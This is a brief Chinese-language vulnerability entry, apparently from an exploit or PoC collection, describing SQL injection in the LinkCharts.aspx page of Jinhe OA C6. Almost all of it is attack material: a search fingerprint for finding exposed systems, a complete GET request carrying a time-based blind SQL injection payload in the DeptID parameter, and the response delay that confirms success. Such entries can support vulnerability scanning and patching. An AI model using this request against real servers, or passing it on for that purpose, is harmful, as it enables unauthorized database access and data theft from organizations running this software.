# 金和网络C6金和OALinkCharts存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/JHSoft.Web.CrmWorkFlat/LinkCharts.aspx/?DeptID=1%27waitfor%20delay%270%3A0%3A5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s